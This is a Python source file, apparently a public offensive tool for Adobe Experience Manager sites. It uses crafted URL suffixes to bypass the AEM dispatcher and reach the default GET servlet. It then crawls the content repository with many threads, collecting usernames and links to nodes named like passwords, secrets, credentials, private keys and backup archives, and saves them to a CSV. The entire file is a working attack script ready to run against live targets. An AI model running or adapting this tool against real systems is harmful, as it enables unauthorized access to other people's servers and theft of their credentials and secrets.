import os
import sys
import json
import time
import datetime
import argparse
import itertools
import traceback
import concurrent.futures
from threading import Lock

import dpath
import requests

requests.packages.urllib3.disable_warnings()


users = set()
secrets = set()
lock = Lock()
running = True


def error(message, **kwargs):
    print('[{}] {}'.format(datetime.datetime.now().time(), message), sys.stderr)
    for n, a in kwargs.items():
        print('\t{}={}'.format(n, a), sys.stderr)

    exc_type, exc_value, exc_traceback = sys.exc_info()
    print('Exception type:' + str(exc_type), sys.stderr)
    print('Exception value:' + str(exc_value), sys.stderr)
    print('TRACE:', sys.stderr)
    traceback.print_tb(exc_traceback, file=sys.stderr)
    print('\n\n\n', sys.stderr)


def normalize_url(base_url, path):
    if base_url[-1] == '/' and (path[0] == '/' or path[0] == '\\'):
        url = base_url[:-1] + path
    else:
        url = base_url + path

    return url


def http_request(url, method='GET', data=None, additional_headers=None, proxy=None):
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'}
    if additional_headers:
        headers.update(additional_headers)

    if not proxy:
        proxy = {}

    resp = requests.request(method, url, data=data, headers=headers, proxies=proxy, verify=False, timeout=20, allow_redirects=False)

    return resp


def dispatcher_bypass_get_servlet(base_url, proxy, debug):
    BASE = ('/', '/content')  # Base nodes names for auto selection
    SUFFIX = ('.json', '......json', '.json/a.css', '.json/a.html', '.json/a.png', '.json/a.ico', '.json/a.1.json'
              '.json;%0aa.css', '.json;%0aa.html', '.json;%0aa.png', '.json;%0aa.ico', '.json;%0aa.1.json')  # Are used to bypass AEM dispatcher

    for base, suffix in itertools.product(BASE, SUFFIX):
        path = base + '.1' + suffix
        url = normalize_url(base_url, path)

        try:
            resp = http_request(url, proxy=proxy)

            if resp.status_code == 200:
                try:
                    json.loads(resp.content.decode())['jcr:primaryType']  # Check if AEM's default GET servlet is accessible
                except:
                    pass
                else:
                    return base, suffix
        except:
            if debug:
                error('Exception', method='dispatcher_bypass_get_servlet')


def process_node_get_servlet(tpe, base_url, base, suffix, current_depth, max_depth, grab_depth, proxy, debug):
    USERS_GLOB = '*By'  # Node with name ending with By should contain username
    SECRETS_GLOBS = ('*[Pp]assword*', '*[Ss]ecret*', '*[Cc]redentials*', '*[Cc]reds*', '*.key', '*.pem',
                     '*[Cc]onfig*.zip', '*[Bb]ackup*.zip',   '*[Ss]ql*.zip')  # Add more patters for secrets

    users = set()
    secrets = set()

    if current_depth > max_depth:
        return users, secrets

    try:
        path = '{0}.{1}{2}'.format(base, grab_depth, suffix)
        url = normalize_url(base_url, path)

        resp = http_request(url, proxy=proxy)  # Get json with metadata for JCR subtree

        if resp.status_code != 200:
            return users

        parsed = json.loads(resp.content.decode())

        result = []
        for d in range(grab_depth):
            result.extend(list(dpath.util.search(parsed, '*/'*d + USERS_GLOB, yielded=True)))  # Grab usernames at each level in subtree

        for _,username in result:  # Extract unique usernames
            users.add(username)

        for s_glob in SECRETS_GLOBS:
            results = []
            for d in range(grab_depth):
                results.extend(list(dpath.util.search(parsed, '*/' * d + s_glob, yielded=True)))  # Grab secret using current glob at each level in subtree

            for secret,_ in results:
                path = normalize_url(base_url, base)
                secrets.add('{0}{1}{2}'.format(path, secret, suffix))  # Save URL to access secret

        paths_to_observe = set()
        for leaf in list(dpath.util.search(parsed, '*/'*grab_depth + USERS_GLOB, yielded=True)):  # Get path to leaf node from subtree root
            p = leaf[0].rsplit('/', 1)[0]
            paths_to_observe.add(p)

        for p in paths_to_observe:
            url = normalize_url(base_url, '/{0}'.format(p))
            params = (tpe, url, base, suffix, current_depth + grab_depth, max_depth, grab_depth, proxy, debug)
            future = tpe.submit(process_node_get_servlet, *params)  # Launch new tasks to explore subtrees
            future.add_done_callback(handle_finding)
    except:
        if debug:
            error('Exception', method='process_node_get_servlet')
    finally:
        return users, secrets


def handle_finding(future):
    global users, secrets, lock, running

    if future.done():
        if not future.exception():
            _users, _secrets = future.result()

            with lock:
                running = True
                users.update(_users)
                secrets.update(_secrets)


def parse_args():
    parser = argparse.ArgumentParser(description='AEM exploration tool by @0ang3el (grabs users and secrets), see the slides - https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps')

    parser.add_argument('--url', help='AEM webapp URL, required parameter')
    parser.add_argument('--base', help='set base node (/etc or /apps or /home or /var), if not set, base node is selected automatically')
    parser.add_argument('--grabdepth', type=int, default=2, help='JCR subtree depth on each iteration, 2 should be a safe value for all nodes')
    parser.add_argument('--maxdepth', type=int, default=4, help='maximum depth for JCR search, increase it to find more')
    parser.add_argument('--workers', type=int, default=10, help='number of parallel workers')
    parser.add_argument('--out', default='output.csv', help='CSV file with results, delimiter symbol is |')
    parser.add_argument('--proxy', help='http and https proxy')
    parser.add_argument('--debug', action='store_true', help='debug output')

    return parser.parse_args(sys.argv[1:])


def main():
    global users, secrets, running, lock

    args = parse_args()

    if args.proxy:
        p = args.proxy
        proxy = {'http': p, 'https': p}
    else:
        proxy = {}

    if not args.url:
        print('You must specify the --url parameter, bye.')
        sys.exit(1337)

    result = dispatcher_bypass_get_servlet(args.url, proxy, args.debug)

    if not result:
        print('AEM Default Get servlet is not accessible.')
        sys.exit(1337)

    base, suffix = result

    if args.base:
        base = args.base

    with concurrent.futures.ThreadPoolExecutor(args.workers) as tpe:
        params = (tpe, args.url, base, suffix, 0, args.maxdepth, args.grabdepth, proxy, args.debug)
        future = tpe.submit(process_node_get_servlet, *params)
        future.add_done_callback(handle_finding)

        while running:
            with lock:
                running = False
            time.sleep(30)

        tpe.shutdown(wait=True)

        with open(args.out, 'w') as outf:  # Write results to a CSV file using | symbol as delimiter
            outf.write('Type|Value' + os.linesep)

            for user in users:
                outf.write('username|{0}{1}'.format(user, os.linesep))

            for secret in secrets:
                outf.write('secret|{0}{1}'.format(secret, os.linesep))


if __name__ == '__main__':
    main()